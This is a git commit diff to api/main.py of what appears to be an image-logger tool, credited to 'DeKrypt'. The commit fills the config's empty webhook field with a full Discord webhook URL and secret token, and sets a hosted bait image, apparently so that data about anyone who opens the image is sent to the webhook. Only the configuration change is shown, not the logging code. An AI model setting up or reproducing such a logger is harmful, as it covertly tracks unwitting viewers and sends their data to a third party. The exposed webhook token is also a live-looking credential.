aa5b209d66b1e4f6c8d8c9453aa70428f655aa79
kin-jpg-arch <changunheo6@gmail.com>
2025-12-24 22:55:54 +0900

    Update main.py

--- api/main.py
+++ api/main.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1452610908051472534/m029st0btoq4gb6DISuH7ryfOpwJULMlDkS72Skuka3ggokKIEUNNq0kcfMHJXiVnl-3",
+    "image": "https://i.postimg.cc/9XxBrXDD/1766580235743135255653396988677.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
